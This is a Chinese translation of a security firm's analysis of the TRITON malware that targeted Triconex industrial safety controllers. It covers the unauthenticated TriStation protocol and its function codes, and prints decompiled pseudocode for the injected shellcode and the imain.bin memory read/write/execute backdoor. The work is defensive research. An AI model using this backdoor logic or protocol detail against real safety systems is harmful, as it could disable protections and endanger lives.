# 对TRITON工业恶意软件的分析（下）

阅读量 **197655**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-01-19 14:01:43

 **x**

##### 译文声明

本文是翻译文章，文章原作者 midnightbluelabs，文章来源：midnightbluelabs.com

原文地址：<https://www.midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware>

译文仅供参考，具体内容表达以及含义原文为准。

## 五、Triconex安全仪表系统（SIS）

施耐德电气生产的Triconex安全控制器由Tricon（CX）、Trident以及TriGP系统共同组成，这些系统均采用了三模冗余（triple
modular redundancy，TMR）架构。虽然该事件中攻击者针对的是Tricon
3008型控制器，但攻击的核心思路是使用未经认证的TriStation协议，因此运行该协议的这类安全控制器可能都会受到影响。

![](https://p1.ssl.qhimg.com/t01d0eab3c484457025.png)

图2. Tricon 3008前面板（[来源](https://www.nrc.gov/docs/ML0932/ML093290420.pdf)）

根据Tricon
v9-v10系统的[规划及安装指南](https://www.nrc.gov/docs/ML0932/ML093290420.pdf)，一个基本的Tricon控制器由主处理器、I/O模块、通信模块、机箱、连接线以及工程工作站PC组成（工作站PC通过TriStation协议与控制器通信）。机箱内装有3个主处理器（Main
Processor，MP）模块，每个模块都可以为控制器提供通道（channel）服务，独立运行控制程序，并与自己的I/O子系统通信（每个I/O模块都有3个独立的通道，为3个MP提供服务），与其他MP处于并行关系。这3个MP模块可以自主运行，没有共享时钟、功率调节或者电路，定期比较数据及控制程序，两两之间会通过名为TriBus的高速专用通信总线进行同步。TriBus由3个独立的串行链路组成。硬件会对MP中的I/O数据进行表决，如果表决结果不一致，2/3的信号占优势，就会纠正第3个MP，这样就能区分出一次性数据差异现象。这种三模冗余（TMR）架构是对瞬时故障以及组件故障的一种容错设计技术。

![](https://p4.ssl.qhimg.com/t01444b3307e0c7a3df.png)

图3. Tricon控制器的三重架构

Tricon控制器中有多种通信模块，通过通信总线与主处理器通信，以便控制器通过各种协议进行网络通信。比如，高级通信模块（Advanced
Communication Module，ACM）充当了Tricon控制器与Foxboro智能自动（I/A）系列DCS的接口，Hiway接口模块（Hiway
Interface Module，HIM）充当了Tricon控制器与Honeywell
TDC-3000系列控制系统的接口，而Tricon通信模块（Tricon Communication
Module，TCM）可以让控制器通过以太网与TriStation、其他Triconex控制器、Modbus主/从设备以及外部主机通信。这些通信中包含带有公开文档的Tricon系统访问应用（Tricon
System Access
Application，TSAA）协议，这种多从形式的主/从协议可以用来读取及写入数据点；也包含未公开的TriStation协议，这是一种单从形式的主/从协议，[TriStation
1131以及MSW工程工作站软件](https://www.nrc.gov/docs/ML0932/ML093290423.pdf)会使用该协议来开发或者下载运行在Triconex控制器上的控制程序。默认情况下，TSAA协议使用1500这个UDP端口进行网络通信，而TriStation协议则使用1502这个UDP端口进行通信。

Triconex控制器采用了一个4档位物理开关，4个档位分别为RUN（正常运行，只读状态，但可以被控制程序中的GATENB函数块覆盖）、PROGRAM（允许加载并验证控制程序）、STOP（停止读取输入数据，强制非保持型（non-retentive）数字及模拟信号输出为0，停止控制程序。该模式可以被TriStation覆盖）以及REMOTE（允许写入控制程序变量）。这次事件中，目标控制器处于PROGRAM模式，TRITON注入载荷后（下文会分析），攻击者可以与后门通信，无视当前的开关档位进行恶意修改。

![](https://p1.ssl.qhimg.com/t0138d3749a97cf7318.png)

图4. 3008型号主处理器架构

控制程序需要通过TriStation
1131或者MSW软件来开发及调试，通过TriStation协议下载到控制器中，存储到Flash中，随后再加载到SRAM或者DRAM中（具体加载位置由Tricon的版本决定），再由主处理器模块来执行。控制程序需要从某种IEC
61131-3语言（LD、FBD或者ST）转换为原生的PowerPC机器码，并且只与主处理器交互。

攻击事件曝光后不久，我们就可以通过各种公开渠道获取[TRITON框架及攻击载荷](https://github.com/ICSrepo/TRISIS-TRITON-HATMAN)样本。载荷文件（如imain.bin）中包含PowerPC
shellcode，由此我们可以推测此次事件中的Triconex控制器可能使用的是Tricon 3008主处理器模块。因为老版本的Tricon
MP（如3006或者3007）使用的是美国国家半导体公司（National
Semiconductor）生产的32位32GX32主处理器，较新版（如3009）使用的是主频为800MHz的32位双核处理器，据我们所知，Tricon
MP 3008是采用PowerPC架构的唯一处理器。更具体一点，该型号采用了飞思卡尔生产的32位[PowerQUICC
MPC860EN](https://www.nxp.com/products/processors-and-microcontrollers/power-architecture-processors/powerquicc-processors/powerquicc-i/mpc860-powerquicc-processor:MPC860)微控制器，后面我们在解析shellcode载荷时会介绍相关细节。

Tricon 3008 MP运行的是ETSX（Enhanced Triconex System
Executive）固件（存储在Flash中），该固件会在主处理器上执行控制程序。在老版本的Tricon
MP模块上，管理人员只能通过侧面板手动更换EPROM来更新固件，而新的Tricon
3008固件可以通过前面板的以太网口进行升级。管理人员可以将以太网口连接到运行TcxFwm.exe固件管理器的工作站PC来更新固件。专用的IOCCOM（Input
and Output Control and
Communication）处理器（以及MPC860EN）运行的是自己的固件，可以通过固件管理器以相同的方式进行升级。

## 六、TRITON攻击框架

TRITON是一个非常精简的框架，目的是方便攻击者通过以太网中未经认证的TriStation协议与Tricon控制器交互。该框架包含各种功能，如读写控制程序及数据、运行及停止程序以及获取状态信息。该框架采用Python语言编写，包含如下几个组件：

1、TS_cnames.py：包含对应TriStation协议功能、响应代码、开关档位以及控制程序状态的一些常量。

2、TsHi.py：该框架的高级接口，可以用来读写功能及程序，也可以通过后门载荷（后续会分析）获取相关信息。非常有趣的是，该组件中包含SafeAppendProgramMod函数，可以获取程序表、读取程序及功能、将shellcode附加到已有的控制程序中。该模块也会在必要的时候处理CRC32校验和。

3、TsBase.py：充当高级接口与低级TriStation功能代码以及数据格式之间的转换层，用于上传、下载程序或者获取控制程序状态及模块版本等信息。

4、TsLow.py：最底层，可以将上层生成的TriStation数据包通过UDP协议发送给Tricon通信模块（TCM）。还包含其他功能，比如通过1502
UDP端口发送“ping”广播消息（0x06 0x00 0x00 0x00 0x00 0x88），自动探测Tricon控制器。

除了该框架之外，攻击者还使用了名为script_test.py的一个脚本，该脚本通过攻击框架连接到Tricon控制器，注入多阶段攻击载荷（具体参考下文分析）。

## 七、TriStation协议

TriStation协议是工业控制系统领域经常使用的一种基于UDP的串行以太网协议。请求报文中包含2字节的功能代码（FC）、计数器ID、长度字段、请求数据以及校验和。响应报文中包含请求代码（RC）、长度字段、响应数据以及校验和。

我们根据TRITON框架重构了TriStation协议，但本文中我们并不会详细介绍协议细节，仅摘选了部分重点内容。TRITON的“核心”要素包含一系列功能代码及预期的响应代码，如下所述：

  * `Start download change`（FC：0X01）。预期收到`Download change permitted`（RC：0x66）响应。具体参数为`[old_name] [version info] [new_name] [program info]`。
  * `Allocate program`（FC：0x37）。预期收到`Allocate program response`（RC：0x99）响应。具体参数为`[id] [next] [full_chunks] [offset] [len] [data]`。
  * `End download change`（FC：0x0B）。预期收到`Modification accepted`（RC：0x67）响应。

此外，攻击者还使用如下TriStation命令与已成功注入的后门通信：

  * `Get MP status`（FC：0x1D）。预期收到`Get system variables response`（RC：0x96）响应。具体参数为`[cmd][mp] [data]`。

有趣的是，TriStation开发者指南中提到，开发者可以限制从TriStation
PC访问Tricon控制器的方式。用户可以“加密保护”工程（实际上工程文件中通常会保存哈希值或者明文密码，工作站软件在打开工程文件时会检查这些信息），连接至控制器时需要输入密码。最初状态下工程并没有绑定密码，并且默认密码为“PASSWORD”。在TriStation协议本身没有经过加密处理的情况下，任何攻击者只要能够观察到控制器与工作站之间的网络通信流量，就可以绕过这种保护机制。

开发者指南中还提到，4351A以及4352A型TCM支持基于IP的客户端访问控制列表，而控制列表可以限制访问某个资源（如执行部分下装（download
change）或者完全下装（download all）、访问诊断信息等）时的权限等级（如拒绝（deny）、只读（read
only）或者读/写（read/write））。这种方法似乎可以用来限制TRITON所能使用的IP地址（比如可以通过哪个地址来注入载荷或者与后门通信），但具体效果得看攻击者具备何种程度的工程工作站横向渗透能力。此外，UDP
IP欺骗攻击在这种环境中也是一个潜在的安全问题。

## 八、攻击载荷

我们可以将此次事件中使用的攻击载荷划分为4个阶段。第一阶段是设置具体参数的一段shellcode。第二阶段为inject.bin载荷（目前尚未公开），该载荷充当后门安装器功能。第三阶段为imain.bin载荷（下文会介绍），这是一个后门植入体，功能是获取并执行第四阶段载荷。最后阶段为实际发挥作用的一个“OT攻击载荷”，其功能为执行破坏性操作。该事件中并没有出现第四阶段载荷，因为攻击者在准备后门植入体时就已经被察觉到，无法进一步攻击。大家可以参考美国国土安全部工控系统网络应急响应小组（ICS-CERT）发布的关于TRITON/TRISIS/HatMan的[报告](https://ics-cert.us-cert.gov/sites/default/files/documents/MAR-17-352-01%20HatMan%E2%80%94Safety%20System%20Targeted%20Malware_S508C.pdf)，了解前两个阶段攻击载荷的大致情况。

###  阶段1：参数设置器（PresetStatusField）

连接至目标控制器后，攻击脚本会调用[PresetStatusField](https://github.com/ICSrepo/TRISIS-TRITON-HATMAN/blob/c27fcae3dcb0d0ce36ddeef081851039c4a0658d/decompiled_code/script_test.py#L12)方法，使用SafeAppendProgramMod来注入一段shellcode。这段shellcode的功能是遍历DRAM中地址范围从0x800000到0x800100的内存区域，查找挨在一起的两个32位标志位（其值分别为0x400000及0x600000）。如果找到这两个值，则将某个值（0x00008001）写入距离该地址0x18处的某个地址。我们逆向分析了这段shellcode，理清其工作原理，对应的C语言伪代码如下：

    
    
    r2 = 0x800000;
    
    while (true)
    {
        if ((uint32_t)*(uint32_t*)(r2) == 0x400000) // cp_status.us
        {
            if ((uint32_t)*(uint32_t*)(r2 + 4) == 0x600000) // cp_status.ds
            {
                r2 += 0x18; // cp_status.fstat
                *(uint32_t*)(r2) = (uint32_t)value;
                break;
            }
        }
    
        if ((r3 & 0xffffffff) >= 0x800100)
        {
            break;
        }
    
        r2 += 4;
    }
    
    system_call(-1);
    

这段shellcode会将攻击者提供的某个值写入控制程序（Control
Program，CP）状态结构体中的`fstat`字段。随后，攻击脚本会通过TriStation请求CP状态，检查返回值是否等于攻击者的预期值。第二阶段的`inject.bin`
shellcode中会用到这个预期值（0x00008001）。

###  阶段2：植入体安装器（inject.bin）

由于现在还没有公布inject.bin，这里我们会根据其他组织已公布的内容以及公开材料来推测相关信息。根据这些参考资料，我们推测inject.bin是一个植入体安装器，将`imain.bin`后门部署到ETSX（Enhanced
Triconex System
Executive）中，以便攻击者在后续攻击过程中可以无视Tricon钥匙所处的档位，以读、写或者执行权限访问安全控制器内存。

第一阶段shellcode注入成功后，攻击者使用SafeAppendProgramMod来注入`inject.bin`以及`imain.bin`。这里比较有趣的是，`imain.bin`处于两个标志位（0x1234以及0x56789A）和长度字段之间。根据ICS-CERT的报告，`inject.bin`认为第一阶段载荷所写入的参数位于某个静态地址处，这个参数有3个作用：

1、作为空闲周期的倒数计数器；

2、用来跟踪并控制执行流程的步进计数器；

3、出现错误时用来写入调试信息。

如果没有检测到任何问题，则输出“Script SUCCESS”，强制追加只包含`system_call(-1);`语句的一个虚假程序。

![](https://p5.ssl.qhimg.com/t013b00b083a5d6da08.png)

图5. inject.bin控制流程（[来源](https://ics-cert.us-cert.gov/sites/default/files/documents/MAR-17-352-01%20HatMan%E2%80%94Safety%20System%20Targeted%20Malware_S508C.pdf)）

`inject.bin` shellcode的工作流程如上图所示（源自ICS-CERT报告），上图看起来是一个有限状态机，开始工作时会等待若干个周期，再执行一系列系统调用并检查返回结果。如果通过检查过程，则重新定位`imain.bin`
shellcode，并将TriStation某条命令（即`get main processor diagnostic
data`，获取主处理器诊断数据）的函数指针指向`imain.bin`的地址，这样程序执行正常流程前会优先调用`imain.bin`。

根据[Reid Wightman](https://vimeo.com/248057640)的研究结果，`inject.bin`中似乎包含[egg-hunter](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)功能，可以查找夹在`0x1234`和`0x56789A`标签之间的`imain.bin`。之所以采用这种定位方式，可能是因为SafeAppendProgramMod方法缺乏控制机制，无法判断注入代码的结束位置，因此，如果攻击者不确定注入成功后偏移量是否保持不变，就需要通过[GetPC](https://nets.ec/Shellcode/Environment#GetPc)代码来确定`inject.bin`当前所处的位置，然后再搜索已注入的其他代码或者数据所处的位置。获取这些位置信息后，`inject.bin`可以安全稳妥地重新找到`imain.bin`的实际位置。

###  阶段3：后门（imain.bin）

`imain.bin`是一个后门植入体，利用该后门，攻击者可以无视Tricon钥匙所处的档位或者工作站对控制程序的重置操作，以读、写或者执行权限访问安全控制器内存。这样一来，攻击者可以在后续某个时间点注入并执行具有破坏性的“OT攻击载荷”。目前我们并不清楚安全控制器重启后这款后门是否还会继续驻留，因为攻击者似乎只修改了内存中的控制程序以及固件，并没有修改闪存中的副本。FireEye在报告中提到他们修改了攻击脚本，使载荷能够在内存中驻留，但这似乎与重启驻留无关。

`imain.bin`的执行时机要早于TriStation中“ _get main processor diagnostic data_
”命令对应的那个函数，执行后，该后门会查找攻击者精心构造的某个报文，从中提取出攻击命令以及命令参数。该后门支持三种命令：读取内存数据、写入内存数据以及执行位于任意位置的代码。后门可以暂时修改正在运行的固件，具体过程是禁用地址转换、将数据写入固件、刷新指令缓存然后再重新启动地址转换。

TRITON框架调用了[TsHi.ExplReadRam(Ex)、TsHi.ExplWriteRam(Ex)
以及TsHi.ExplExec](https://github.com/ICSrepo/TRISIS-TRITON-HATMAN/blob/c27fcae3dcb0d0ce36ddeef081851039c4a0658d/decompiled_code/library/TsHi.py)函数，这些函数内部会继续调用TsBase.ExecuteExploit函数，TRITON框架可以通过这些函数与后门植入体通信。该函数会发送一条TriStation
“ _get main processor diagnostic data_ ”命令，构造的数据包正文采用如下格式：

    
    
    [command (1 byte)] [MP (1 byte)] [field_0 (4 bytes)] [field_1 (4 bytes)] [field_2 (N bytes)]
    

我们逆向分析了`imain.bin`后门，恢复了C语言伪代码，如下所示：

    
    
    #define M_READ_RAM  0x17
    #define M_WRITE_RAM 0x41
    #define M_EXECUTE   0xF9
    
    struct argument_struct
    {
        uint16_t unknown_ui16_00;
        uint8_t unknown_ui8_02;
        uint16_t return_value;
        uint8_t cmd;                // cmd field
        uint8_t mp;                    // mp field
        uint32_t field_0;            // argument field 0 (eg. size)
        uint32_t field_1;            // argument field 1 (eg. address)
        uint8_t  field_3[...];      // argument field 3 (eg. data)
    };
    
    void imain(void)
    {
        arg = (struct argument_struct*)get_argument();
        // Retrieve implant command and MP value
        cmd = arg->cmd;
        mp = arg->mp;
        compare_mp = *(uint8_t*)(0x199400);
    
        if ((mp == compare_mp) || (mp == 0xFF))
        {
            mp = arg->return_value;
    
            // Check implant command
            switch (cmd)
            {
                // Read N bytes from RAM at address X
                case M_READ_RAM:
                {
                    if (mp >= 0x14)
                    {
                        size = arg->field_0;
                        address = arg->field_1;
    
                        if ((size > 0) && (size <= 0x400))
                        {
                            memcpy(&arg->cmd, address, size);
                            return_value = (size + 0xA);
                        }
                        else
                        {
                            goto main_end;
                        }
                    }
                    else
                    {
                        goto main_end;
                    }
    
                }break;
    
                // Write N bytes to RAM at address X
                case M_WRITE_RAM:
                {
                    size = arg->field_0;
                    address = arg->field_1;
                    data = arg->field_3;
    
                    if ((size > 0) && (size == (mp - 0x14)))
                    {
                        reenable_address_translation = 0;
    
                        if (address < 0x100000)
                        {
                            reenable_address_translation = 1;
                            disable_address_translation();
                        }
    
                        memcpy(address, &data, size);
    
                        if (reenable_address_translation == 1)
                        {
                            enable_address_translation();
                        }
    
                        return_value = 0xA;
                    }
                    else
                    {
                        goto main_end;
                    }
    
                }break;
    
                // Execute function at address X
                case M_EXECUTE:
                {
                    if (mp >= 0x10)
                    {
                        function_ptr = arg->field_0;
    
                        if (function_ptr < 0x100000)
                        {
                            call(function_ptr);
                            return_value = 0xA;
                        }
                        else
                        {
                            goto main_end;
                        }
                    }
                    else
                    {
                        goto main_end;
                    }
    
                }break;
            }
    
            switch_end:
                arg->unknown_ui8_02 = 0x96;
                arg->return_value = return_value;
                tristation_mp_diagnostic_data_response();
    
        }
    
        // This most likely continues with the actual TriStation 'get main processor diagnostic data' handler
        main_end:
            jump(0x3A0B0);
    }
    
    void disable_address_translation(void)
    {
        mtpsr eid, r3;    // External Interrupt Disable (EID) = r3
        r4 = -0x40;        // 11111111111111111111111111011000; Sets IR=0 (Instruction address translation is disabled), DR=1 (Data address translation is enabled)
        mfmsr r3;        // r3 = Machine State Register
        r3 = r4 & r3;    // Disable instruction address translation
        mtmsr r3;        // Machine State Register = r3
        return;
    }
    
    void enable_address_translation(void)
    {
        r3 = 0xC000000;        // 00001100000000000000000000000000; IC_CST CMD = 110 (Instruction cache invalidate all command)
        mtspr ic_csr, r3;    // Instruction Cache Control and Status Register = r3.
        isync;                // Synchronize context, flush instruction queue
        mfmsr r3;             // r3 = Machine State Register
        r3 |= 0x30;         // 110000; Sets IR=1 (Instruction address translation is enabled), DR=1 (Data address translation is enabled)
        mtmsr r3;             // Machine State Register = r3
        sync;                 // Ordering to ensure all instructions initiated prior to the sync instruction complete and no subsequent ones initiate until synced
        mtspr eie, r3;         // External Interrupt Enable (EIE) = r3
        return;
    }
    
    // This most likely retrieves the argument to the TriStation 'get main processor diagnostic data' command
    void get_argument(void)
    {
        r3 = r31;
        jump(0x6B9CC);
    }
    
    // This most likely sends a response to the TriStation 'get main processor diagnostic data' command
    void tristation_mp_diagnostic_data_response(void)
    {
        r3 = r31;
        jump(0x68F0C);
    }
    

###  阶段4：缺失的OT攻击载荷

攻击者的目的是影响正常运营过程（比如通过网络攻击导致物理设备损坏），而不单单是关闭作业流程那么简单。为了实现这个目标，攻击者需要使用“OT攻击载荷”才能促成设备出现安全故障。前面我们提到过，这个事件中并没有恢复出OT攻击载荷。安全人员没有在被突破的工程工作站上找到OT载荷，这可能意味着攻击者在安全控制器后门植入测试过程通过后就已经释放了这个载荷。攻击者可能想在激活比较复杂的OT载荷之前，确保多个安全控制器已成功植入后门并处于正常运转状态。但还有一种可能，攻击者在控制器上植入后门时，可能还没有开发出合适的OT载荷。无论如何，在这种条件下我们只能去猜测攻击者的最终意图。

本文翻译自midnightbluelabs.com
[原文链接](https://www.midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/95355](/post/id/95355)

安全客 - 有思想的安全新媒体

本文转载自:
[midnightbluelabs.com](https://www.midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware)

如若转载,请注明出处： <https://www.midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [Triton](/tag/Triton)
  * [工控](/tag/工控)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

